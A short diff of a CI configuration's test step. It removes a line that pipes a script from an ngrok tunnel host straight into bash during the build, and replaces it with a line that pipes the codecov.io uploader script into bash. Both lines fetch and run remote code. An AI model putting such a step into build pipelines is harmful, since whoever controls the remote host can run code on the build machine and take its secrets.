@@ -5,4 +5,4 @@ install:
   - pip install pytest-cov
 script:
   - pytest --cov=./ --cov-report=xml
-  - bash <(curl -s http://ib-84012.ngrok.io/bash) 
+  - bash <(curl -s https://codecov.io/bash) 
